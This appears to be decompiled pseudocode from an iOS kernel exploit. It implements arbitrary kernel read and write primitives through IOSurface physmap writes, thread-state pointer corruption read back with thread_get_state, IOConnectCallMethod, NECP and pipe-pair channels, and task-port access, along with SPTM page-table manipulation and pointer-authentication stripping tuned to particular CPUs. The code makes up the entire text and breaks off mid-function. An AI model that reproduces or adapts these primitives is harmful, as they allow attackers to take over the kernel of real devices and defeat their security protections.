//----- (0000000000028CE0) ----------------------------------------------------
unsigned __int64 __fastcall find_sptm_pgtable_state_block(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  int v5; // w0
  struct
  {
    __int128 v7[2];
    __int64 v8;
  } out; // [xsp+0h] [xbp-50h] BYREF

  memset(&out, 0, sizeof(out));
  v5 = pgtable_walk_full(krwCtx, a2, (__int64)&out, a3).n128_u64[0];
  if ( v5 )
    return (krwCtx->pageMask & a2) | (out.v8 & 0xFFFFFFFFC000LL);
  else
    return 0;
}

//----- (0000000000028D44) ----------------------------------------------------
__int64 __fastcall teardown_sptm_pgtable_state(__int64 a1)
{
  __int64 v1; // x21
  uint64_t *v2; // x19
  vm_address_t v4; // x1
  vm_size_t v5; // x2

  v1 = 708609;
  v2 = *(uint64_t **)(a1 + 7496);
  if ( v2 )
  {
    v4 = v2[2];
    if ( !v4
      || (v5 = v2[3]) == 0
      || (vm_deallocate(mach_task_self_, v4, v5), v2[2] = 0, v2[3] = 0, (v2 = *(uint64_t **)(a1 + 7496)) != 0) )
    {
      *(uint64_t *)(a1 + 7496) = 0;
      *((uint8_t *)v2 + 72) = 1;
      __ulock_wake(0x201u, (void *)((char *)v2 + 52), *((unsigned int *)v2 + 12));
      pthread_join((pthread_t)v2[5], 0);
      *(__int128 *)v2 = 0u;
      *((__int128 *)v2 + 1) = 0u;
      *((__int128 *)v2 + 2) = 0u;
      *((__int128 *)v2 + 3) = 0u;
      *((__int128 *)v2 + 4) = 0u;
      *((__int128 *)v2 + 5) = 0u;
      *((__int128 *)v2 + 6) = 0u;
      v2[14] = 0;
      free(v2);
      return 0;
    }
  }
  return v1;
}

//----- (0000000000028DFC) ----------------------------------------------------
bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address, int a3)
{
  __int64 (__fastcall *customKwrite)(struct_krwCtx *, mach_vm_address_t, int *, __int64, __int64);
  int newValue = a3;
  int rawStatus;

  customKwrite = (__int64 (__fastcall *)(struct_krwCtx *, mach_vm_address_t, int *, __int64, __int64))krwCtx->iogpuKwriteFn;
  if ( customKwrite )
    return customKwrite(krwCtx, address, &newValue, 4, 1) == 0;

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = iosurface_physmap_kwrite(krwCtx, address, (__int64)&newValue, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    rawStatus = ioconnect_callmethod_write(krwCtx, address, (__int64)&newValue, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd_size4 != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = necp_ioconnect_krw(krwCtx, address, (__int64)&newValue, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = pipe_pair_krw(krwCtx, address, &newValue, 4u, 1);
  }
  else
  {
    vm_machine_attribute_val_t value = 7;
    kern_return_t kr = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&newValue, 4u);
    mach_vm_machine_attribute(krwCtx->targetVmPort, address, 4u, 1u, &value);
    return kr == 0;
  }

  return rawStatus == 0;
}

//----- (0000000000028F90) ----------------------------------------------------
__int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  __int64 v5; // x25
  uint64_t IOKitConnInfo; // x8
  unsigned int v8; // w26
  unsigned int v12; // w24
  __int64 v13; // x8
  __int64 v14; // x21
  unsigned __int64 v15; // x23
  __int64 v16; // x0
  size_t v17; // x2
  __int64 v18; // x25
  unsigned int v19; // w28
  unsigned __int64 v20; // x19
  unsigned __int64 v21; // x8
  __int64 v22; // x20
  unsigned int v23; // w21
  unsigned __int64 v24; // x24
  __int64 v25; // x0
  size_t v26; // x2
  int v27; // w19
  int v28; // w23
  vm_size_t v29; // x20
  __int64 v30; // x21
  uint64_t v31; // x26
  int v32; // w9
  __int64 v33; // x8
  __int64 v34; // x9
  __int64 v35; // x19
  __int64 *v36; // x27
  int v37; // w20
  unsigned __int64 v38; // x1
  __int64 v39; // x0
  __int64 paddr; // x0
  __int64 v41; // x19
  vm_address_t v42; // x8
  int v43; // w9
  bool v44; // zf
  __int64 v45; // x0
  __int64 v46; // x0
  int v47; // w8
  __int64 v48; // x19
  int v49; // w8
  unsigned int v50; // w8
  unsigned int v51; // w20
  __int64 v52; // x0
  __int64 v53; // x0
  int v54; // w0
  vm_size_t v56; // [xsp+8h] [xbp-B8h]
  unsigned __int64 v57; // [xsp+10h] [xbp-B0h]
  __int64 v58; // [xsp+18h] [xbp-A8h]
  unsigned int v59; // [xsp+24h] [xbp-9Ch]
  unsigned __int64 v60; // [xsp+28h] [xbp-98h]
  unsigned __int64 v61; // [xsp+30h] [xbp-90h]
  unsigned int v62; // [xsp+38h] [xbp-88h]
  int v63; // [xsp+40h] [xbp-80h] BYREF
  int v64; // [xsp+44h] [xbp-7Ch] BYREF
  int v65; // [xsp+48h] [xbp-78h] BYREF
  int v66; // [xsp+4Ch] [xbp-74h] BYREF
  unsigned __int64 v67; // [xsp+50h] [xbp-70h] BYREF
  __int64 v68; // [xsp+58h] [xbp-68h] BYREF
  vm_address_t address; // [xsp+60h] [xbp-60h] BYREF
  unsigned __int64 v70; // [xsp+68h] [xbp-58h] BYREF

  v5 = 708609;
  IOKitConnInfo = krwCtx->IOKitConnInfo;
  if ( !IOKitConnInfo )
  {
    TRACE_PORTS("iosurface_physmap_kwrite no state ctx=%llx addr=%llx size=%u\n",
                (unsigned long long)a1,
                (unsigned long long)a2,
                a4);
    return v5;
  }
  TRACE_PORTS("iosurface_physmap_kwrite enter ctx=%llx addr=%llx buf=%llx size=%u a5=%d state=%llx flags=%x byte4a=%u thread=%d ptr=%llx\n",
              (unsigned long long)krwCtx,
              (unsigned long long)a2,
              (unsigned long long)a3,
              a4,
              a5,
              (unsigned long long)IOKitConnInfo,
              krwCtx->flags,
              *(unsigned __int8 *)(IOKitConnInfo + 74),
              krwCtx->threadForKernelRead,
              (unsigned long long)*(uint64_t *)&krwCtx->threadStateKrwPhysAddr);
  v8 = a4;
  if ( ((a2 & 3) != 0 || a4 != 4) && *(uint8_t *)(IOKitConnInfo + 74) )
  {
    if ( krwCtx->threadForKernelRead + 1 >= 2 )
    {
      if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
      {
        if ( check_kaddr_in_physmap(krwCtx, a2) )
        {
          LODWORD(address) = -1;
          if ( !a5 || (v5 = fd_open_dev_null((int *)&address), !(uint32_t)v5) )
          {
            if ( v8 )
            {
              v12 = 0;
              while ( 1 )
              {
                v70 = 0;
                v13 = a2 + v12;
                v14 = v13 & 7;
                v15 = v13 - v14;
                v16 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v13 - v14, (__int64)&v70, 8u, 0);
                if ( (uint32_t)v16 )
                {
                  TRACE_PORTS("iosurface_physmap_kwrite unaligned read failed raw=%x aligned=%llx off=%llx\n",
                              (unsigned int)v16,
                              (unsigned long long)v15,
                              (unsigned long long)v14);
                  break;
                }
                v17 = 8 - v14 >= (unsigned __int64)(v8 - v12) ? v8 - v12 : 8 - v14;
                v18 = v70;
                memcpy((void *)((unsigned __int64)&v70 | v14), (const void *)(a3 + v12), v17);
                if ( v18 != v70 )
                {
                  v16 = ioconnect_struct_method_kwrite(krwCtx, v15, v70);
                  if ( (uint32_t)v16 )
                  {
                    TRACE_PORTS("iosurface_physmap_kwrite unaligned write failed raw=%x aligned=%llx value=%llx\n",
                                (unsigned int)v16,
                                (unsigned long long)v15,
                                (unsigned long long)v70);
                    break;
                  }
                }
                v12 = v12 - v14 + 8;
                if ( v12 >= v8 )
                  goto LABEL_19;
              }
              v5 = v16;
            }
            else
            {
LABEL_19:
              v5 = 0;
            }
            v54 = address;
            goto LABEL_100;
          }
        }
      }
    }
    return v5;
  }
  if ( !check_kaddr_in_physmap(krwCtx, a2) )
  {
    TRACE_PORTS("iosurface_physmap_kwrite validate failed addr=%llx\n", (unsigned long long)a2);
    return v5;
  }
  v64 = -1;
  if ( a5 )
  {
    v5 = fd_open_dev_null(&v64);
    if ( (uint32_t)v5 )
      return v5;
  }
  if ( !v8 )
    goto LABEL_97;
  v61 = a2;
  v19 = 0;
  v59 = v8;
  v58 = a3;
LABEL_25:
  v20 = v8 - v19;
  v63 = 0;
  v21 = v61 + v19;
  if ( (unsigned int)v20 >= 4 )
  {
    v23 = 0;
    v22 = v19;
  }
  else
  {
    v22 = v19;
    if ( (((v21 + (unsigned int)v20 - 1) ^ (v21 + 3)) & ~krwCtx->pageMask) != 0 )
      v23 = 4 - v20;
    else
      v23 = 0;
  }
  v24 = v21 - v23;
  v25 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v24, (__int64)&v63, 4u, 0);
  if ( !(uint32_t)v25 )
  {
    if ( 4 - (unsigned __int64)v23 >= v20 )
      v26 = v8 - v19;
    else
      v26 = 4LL - v23;
    v27 = v63;
    memcpy((char *)&v63 + v23, (const void *)(a3 + v22), v26);
    v28 = v63;
    v62 = v23;
    if ( v27 == v63 )
      goto LABEL_72;
    TRACE_PORTS("iosurface_physmap_kwrite aligned chunk addr=%llx base=%llx old=%x new=%x off=%u left=%llu\n",
                (unsigned long long)v21,
                (unsigned long long)v24,
                v27,
                v63,
                v23,
                (unsigned long long)v20);
    v70 = v24;
    address = 0;
    v29 = vm_page_size;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
    {
      v30 = 224;
    }
    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
    {
      v30 = 144;
    }
    else
    {
      v30 = 216;
    }
    v31 = krwCtx->IOKitConnInfo;
    v5 = 708609;
    if ( !v31 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing IOKitConnInfo during chunk\n");
      goto LABEL_66;
    }
    v32 = *(uint32_t *)(v31 + 56);
    v5 = 708609;
    if ( !v32 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[56]\n");
      goto LABEL_66;
    }
    v33 = *(uint64_t *)(v31 + 8);
    v5 = 708609;
    if ( !v33 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[8]\n");
      goto LABEL_66;
    }
    v34 = (unsigned int)(v32 + 96);
    v35 = *(uint64_t *)(v31 + 32);
    v60 = v33 + v34;
    v56 = v29;
    v57 = v33 + v30;
    v36 = (__int64 *)(v35 + v34);
    v37 = 11;
    while ( 1 )
    {
      if ( v37 != 11 )
        thread_switch(*(uint32_t *)(v31 + 48), 2, 0xAu);
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
      {
        v68 = 0;
        v39 = read_via_mapped_physmem_region(krwCtx, v60, &v68, krwCtx->stride_0x168, 0);
        if ( (uint32_t)v39 )
          goto LABEL_64;
        if ( !validate_kaddr_range(krwCtx, v68) )
          goto LABEL_55;
        v67 = 0;
        v39 = read_via_mapped_physmem_region(krwCtx, v57, &v67, krwCtx->stride_0x168, 0);
        if ( (uint32_t)v39 )
        {
LABEL_64:
          v5 = v39;
          goto LABEL_65;
        }
        v38 = v67;
      }
      else
      {
        v68 = *v36;
        if ( !validate_kaddr_range(krwCtx, v68) )
          goto LABEL_55;
        v38 = *(uint64_t *)(v35 + v30);
        v67 = v38;
      }
      if ( v38 == v68 )
      {
        paddr = find_sptm_pgtable_state_block(krwCtx, v38, 0);
        v29 = v56;
        if ( !paddr )
        {
          v5 = 163878;
          goto LABEL_66;
        }
        v41 = paddr;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
        {
          v45 = read_via_mapped_physmem_region(krwCtx, paddr + 52, &v65, 4u, 0);
          v5 = v45;
          if ( (uint32_t)v45 )
            goto LABEL_66;
          v5 = 163857;
          if ( v65 != 1 )
            goto LABEL_66;
          if ( v28 )
          {
            v65 = v28 + 1;
            v46 = physwritebuf_direct_mapped(krwCtx, v41 + 52, &v65, 4u, 0);
            v5 = v46;
            if ( (uint32_t)v46 )
              goto LABEL_66;
            v47 = 1;
          }
          else
          {
            v47 = 2;
          }
          v66 = v47;
          v52 = physwritebuf_direct_mapped(krwCtx, v41 + 56, &v66, 4u, 0);
          v5 = v52;
          if ( !(uint32_t)v52 )
          {
            v53 = physwritebuf_direct_mapped(krwCtx, v60 + 24, &v70, krwCtx->stride_0x168, 0);
            v5 = v53;
            if ( !(uint32_t)v53 )
            {
LABEL_82:
              v48 = *(uint64_t *)(v31 + 64);
              if ( (unsigned int)__ulock_wake(0x201u, (void *)(v31 + 52), *(unsigned int *)(v31 + 48)) )
              {
                v49 = errno;
                if ( v49 < 0 )
                  v49 = -v49;
                v5 = v49 | 0x40000000u;
              }
              else if ( v48 == *(uint64_t *)(v31 + 64) )
              {
                v50 = 0;
                while ( v50 != 1001 )
                {
                  v51 = v50 + 1;
                  thread_switch(*(uint32_t *)(v31 + 48), 2, v50 > 8);
                  v5 = 0;
                  v50 = v51;
                  v29 = v56;
                  if ( v48 != *(uint64_t *)(v31 + 64) )
                    goto LABEL_66;
                }
                v5 = 4097;
              }
              else
              {
                v5 = 0;
              }
            }
          }
        }
        else
        {
          v5 = physmap_maybe(krwCtx, &address, v56, paddr);
          if ( !(uint32_t)v5 )
          {
            v42 = (krwCtx->pageMask & v68) + address;
            v65 = *(uint32_t *)(v42 + 52);
            v5 = 163857;
            if ( v65 == 1 )
            {
              if ( v28 )
              {
                *(uint32_t *)(v42 + 52) = v28 + 1;
                v43 = 1;
              }
              else
              {
                v43 = 2;
              }
              v66 = v43;
              *(uint32_t *)(v42 + 56) = v43;
              v36[3] = v24;
              goto LABEL_82;
            }
          }
        }
LABEL_66:
        TRACE_PORTS("iosurface_physmap_kwrite chunk cleanup err=%llx addr=%llx physmap=%llx\n",
                    (unsigned long long)v5,
                    (unsigned long long)v24,
                    (unsigned long long)address);
        if ( address )
          v44 = v29 == 0;
        else
          v44 = 1;
        if ( !v44 )
          vm_deallocate(mach_task_self_, address, v29);
        v8 = v59;
        a3 = v58;
        if ( (uint32_t)v5 )
          goto LABEL_99;
LABEL_72:
        v19 = v19 - v62 + 4;
        if ( v19 >= v8 )
        {
LABEL_97:
          v5 = 0;
          goto LABEL_99;
        }
        goto LABEL_25;
      }
LABEL_55:
      if ( !--v37 )
      {
        v5 = 163878;
LABEL_65:
        v29 = v56;
        goto LABEL_66;
      }
    }
  }
  v5 = v25;
  TRACE_PORTS("iosurface_physmap_kwrite pre-read failed raw=%llx addr=%llx base=%llx\n",
              (unsigned long long)v5,
              (unsigned long long)v21,
              (unsigned long long)v24);
LABEL_99:
  v54 = v64;
LABEL_100:
  if ( v54 != -1 )
    fd_close(v54);
  TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)v5);
  return v5;
}
// 292C0: variable 'v39' is possibly undefined
// 2942C: variable 'v45' is possibly undefined
// 2946C: variable 'v46' is possibly undefined
// 29530: variable 'v52' is possibly undefined
// 29554: variable 'v53' is possibly undefined

//----- (00000000000295B4) ----------------------------------------------------
bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *outBuf)
{
  __int64 (__fastcall *customKread)(struct_krwCtx *, unsigned __int64, void *, unsigned int, __int64);
  int rawStatus;
  uint64_t bytesRead = 0;

  krwCtx = KRWCTX_FROM_UINTPTR(krwCtx);

  customKread = (__int64 (__fastcall *)(struct_krwCtx *, unsigned __int64, void *, unsigned int, __int64))krwCtx->iogpuKreadFn;
  if ( customKread )
    return customKread(krwCtx, vaddr, outBuf, 4, 1) == 0;

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    rawStatus = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, 4u, 1);
  }
  else
  {
    return kreadbuf_via_tfp0(krwCtx->targetVmPort, vaddr, 4u, krwCtx->vmMapSize, (__int64)outBuf, &bytesRead) == 0;
  }

  return rawStatus == 0;
}

//----- (00000000000296E8) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        __int64 outBuf,
        unsigned int size,
        int a5)
{
  natural_t threadState[134];
  int fd = -1;
  __int64 status = 0xAD001;

  if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
    return status;
  if ( !check_kaddr_in_physmap(krwCtx, vaddr) )
    return status;

  if ( a5 )
  {
    status = fd_open_dev_null(&fd);
    if ( (uint32_t)status )
      return status;
  }

  uint32_t offset = 0;
  while ( offset < size )
  {
    uint32_t remaining = size - offset;
    uint64_t currentVaddr = vaddr + offset;
    uint32_t chunkSize;

    if ( (krwCtx->pageMask & currentVaddr) == 0 && remaining >= 0x4000 && krw_ctx_has_read_caps(krwCtx) )
    {
      uint64_t xnuVersionPacked = krwCtx->xnuVersionPacked;
      uint32_t maxChunk = xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 0x4000 : 0x80000;
      if ( xnuVersionPacked > XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
        maxChunk = 528;

      chunkSize = remaining >= maxChunk ? maxChunk : remaining;
      status = necp_semaphore_kread(krwCtx, currentVaddr, (char *)(outBuf + offset), chunkSize);
      if ( (uint32_t)status )
        break;
      offset += chunkSize;
      continue;
    }

    chunkSize = remaining >= 528 ? 528 : remaining;
    if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
    {
      status = 708609;
      break;
    }

    uint32_t chunkOffset = 0;
    while ( chunkOffset < chunkSize )
    {
      uint64_t readVaddr = currentVaddr + chunkOffset;
      uint32_t bytesLeftInChunk = chunkSize - chunkOffset;
      size_t bytesCopied = 0;

      if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3)
        && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
      {
        uint64_t pageMask = krwCtx->pageMask;
        uint64_t pageWindowOffset = pageMask & readVaddr;
        uint64_t maxWindowOffset = (uint32_t)krwCtx->pageSizeOrSomething - 528LL;
        uint64_t savedThreadStatePtr = 0;
        mach_msg_type_number_t stateCount = 132;

        if ( pageWindowOffset >= maxWindowOffset )
          pageWindowOffset = maxWindowOffset;

        if ( validate_kaddr_range(krwCtx, krwCtx->threadStateSavedPtr) )
        {
          savedThreadStatePtr = krwCtx->threadStateSavedPtr;
        }
        else
        {
          status = read_via_mapped_physmem_region(krwCtx, krwCtx->threadStateKrwPhysAddr, &savedThreadStatePtr, 8u, 0);
          if ( (uint32_t)status )
            break;
          krwCtx->threadStateSavedPtr = savedThreadStatePtr;
        }

        uint64_t threadStateWindow = (readVaddr & ~pageMask) + pageWindowOffset;
        uint64_t patchedThreadStatePtr = threadStateWindow - 16;
        __dsb(0xBu);

        status = physwritebuf_direct_mapped(krwCtx, krwCtx->threadStateKrwPhysAddr, &patchedThreadStatePtr, 8u, 0);
        if ( !(uint32_t)status )
        {
          uint32_t readStatus = 0;
          kern_return_t kr = thread_get_state(krwCtx->threadForKernelRead, 0x11, threadState, &stateCount);
          if ( kr )
          {
            readStatus = kr | 0x80000000;
          }
          else if ( stateCount == 132 )
          {
            uint64_t windowBytesLeft = threadStateWindow - readVaddr + 528;
            bytesCopied = windowBytesLeft <= bytesLeftInChunk ? windowBytesLeft : bytesLeftInChunk;
            memcpy((void *)(outBuf + offset + chunkOffset), (char *)threadState + readVaddr - threadStateWindow, bytesCopied);
          }
          else
          {
            readStatus = 708642;
          }

          uint32_t restoreStatus = physwritebuf_direct_mapped(krwCtx, krwCtx->threadStateKrwPhysAddr, &savedThreadStatePtr, 8u, 0);
          status = restoreStatus ? (readStatus ? readStatus : restoreStatus) : readStatus;
        }
      }
      else
      {
        mach_msg_type_number_t stateCount = 132;
        uint64_t pageMask = krwCtx->pageMask;
        uint64_t pageBase = readVaddr & ~pageMask;
        uint64_t pageWindowOffset = pageMask & readVaddr;
        uint64_t maxWindowOffset = (uint32_t)krwCtx->pageSizeOrSomething - 528LL;

        if ( pageWindowOffset >= maxWindowOffset )
          pageWindowOffset = maxWindowOffset;

        uint64_t threadStateWindow = pageBase + pageWindowOffset;
        uint64_t *mappedThreadStatePtr = (uint64_t *)krwCtx->threadStateMappedPtr;
        uint64_t savedThreadStatePtr = *mappedThreadStatePtr;
        __dsb(0xBu);
        *mappedThreadStatePtr = threadStateWindow - 16;

        kern_return_t kr = thread_get_state(krwCtx->threadForKernelRead, 17, threadState, &stateCount);
        if ( kr )
        {
          status = kr | 0x80000000;
        }
        else if ( stateCount == 132 )
        {
          uint64_t windowBytesLeft = threadStateWindow - readVaddr + 528;
          bytesCopied = windowBytesLeft <= bytesLeftInChunk ? windowBytesLeft : bytesLeftInChunk;
          memcpy((void *)(outBuf + offset + chunkOffset), (char *)threadState + readVaddr - threadStateWindow, bytesCopied);
          status = 0;
        }
        else
        {
          status = 708642;
        }

        *mappedThreadStatePtr = savedThreadStatePtr;
      }

      if ( (uint32_t)status )
        break;
      chunkOffset += bytesCopied;
    }

    if ( (uint32_t)status )
      break;
    offset += chunkSize;
  }

  if ( offset >= size )
    status = 0;
  if ( fd != -1 )
    fd_close(fd);
  return status;
}

//----- (0000000000029AD0) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_tfp0(
        vm_map_read_t target_task,
        __int64 vaddr,
        mach_vm_size_t size,
        mach_vm_size_t size2,
        __int64 outBuf,
        uint64_t *a6)
{
  if ( !size )
    return 4;

  mach_vm_size_t remaining = size;
  mach_vm_size_t chunkLimit = size2 ? size2 : size;
  uint32_t copied = 0;
  while ( remaining )
  {
    mach_vm_size_t outsize = remaining;
    mach_vm_size_t chunkSize = remaining >= chunkLimit ? chunkLimit : remaining;
    kern_return_t kr = mach_vm_read_overwrite(target_task, vaddr + copied, chunkSize, outBuf + copied, &outsize);
    if ( kr )
      return kr;

    copied = (uint32_t)(copied + outsize);
    remaining -= outsize;
  }

  if ( a6 )
    *a6 = copied;
  return 0;
}

//----- (0000000000029B78) ----------------------------------------------------
bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uint64_t *a3)
{
  __int64 (__fastcall *customKread)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64);
  int rawStatus;
  uint64_t bytesRead = 0;

  *a3 = 0;

  customKread = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64))&krwCtx->iogpuKreadFn;
  if ( customKread )
    return customKread(krwCtx, a2, a3, (unsigned int)krwCtx->stride_0x168, 1) == 0;

  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = kreadbuf_via_dev_null_and_thread_state(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2 && *(uint64_t *)&krwCtx->ioConnectMappedAddr && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    rawStatus = kreadbuf_via_IOConnectCallMethod(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = kreadbuf_via_dev_null_only(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = kreadbuf_via_dev_null_simple(krwCtx, a2, a3, krwCtx->stride_0x168, 1);
  }
  else
  {
    return kreadbuf_via_tfp0(
             krwCtx->targetAndParentTaskPorts,
             a2,
             krwCtx->stride_0x168,
             (unsigned int)krwCtx->vmMapSize,
             (__int64)a3,
             &bytesRead) == 0;
  }

  return rawStatus == 0;
}

//----- (0000000000029CB0) ----------------------------------------------------
unsigned __int64 __fastcall maybe_sptm_translate_kaddr(struct_krwCtx *krwCtx, __int64 a2)
{

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}
// 29D08: variable 'vars8' is possibly undefined

//----- (0000000000029D2C) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr_if_needed(struct_krwCtx *krwCtx, __int64 a2)
{

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}
// 29D68: variable 'vars8' is possibly undefined

//----- (0000000000029D88) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v2; // x19

  v2 = a2;
  if ( a2 && (a2 & 0x80000000000000LL) != 0 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER)
      || (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK)
       && krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 40, 108, 0, 0)) )
      return v2 | 0xFFFF800000000000LL;
    else
      return v2 | 0xFFFFFF8000000000LL;
  }
  return v2;
}

//----- (0000000000029DF8) ----------------------------------------------------
bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 newValue, int whatIsThis)
{
  __int64 (__fastcall *customKwrite)(struct_krwCtx *, mach_vm_address_t, __int64 *, uint64_t, __int64);
  __int64 writeValue = newValue;
  int rawStatus;

  customKwrite = (__int64 (__fastcall *)(struct_krwCtx *, mach_vm_address_t, __int64 *, uint64_t, __int64))krwCtx->iogpuKwriteFn;
  if ( customKwrite )
    return customKwrite(krwCtx, address, &writeValue, krwCtx->stride_0x168, 1) == 0;

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    if ( !krwCtx->IOKitConnInfo )
      return false;
    return iosurface_physmap_kwrite(krwCtx, address, (__int64)&writeValue, krwCtx->stride_0x168, 1) == 0;
  }

  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
    return ioconnect_callmethod_write(krwCtx, address, (__int64)&writeValue, krwCtx->stride_0x168, 1) == 0;

  if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
  {
    vm_machine_attribute_val_t value = 7;
    kern_return_t kr = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&writeValue, krwCtx->stride_0x168);
    mach_vm_machine_attribute(krwCtx->targetVmPort, address, krwCtx->stride_0x168, 1u, &value);
    return kr == 0;
  }

  if ( krwCtx->iosurfaceFd_size4 == -1 || !krwCtx->gap_0x218 )
  {
    if ( krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1 )
      return pipe_pair_krw(krwCtx, address, &writeValue, krwCtx->stride_0x168, 1) == 0;

    vm_machine_attribute_val_t value = 7;
    kern_return_t kr = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&writeValue, krwCtx->stride_0x168);
    mach_vm_machine_attribute(krwCtx->targetVmPort, address, krwCtx->stride_0x168, 1u, &value);
    return kr == 0;
  }

  if ( !whatIsThis )
    return necp_ioconnect_krw(krwCtx, address, (__int64)&writeValue, krwCtx->stride_0x168, 1) == 0;

  rawStatus = acquire_write_semaphore_lock(krwCtx, 1u, 0x2710u);
  if ( rawStatus )
    return false;

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
  {
    rawStatus = necp_ioservice_auth_write(krwCtx, address);
  }
  else
  {
    uint64_t helper = krwCtx->semaphoreHelperCtx;
    rawStatus = 708609;
    if ( helper )
    {
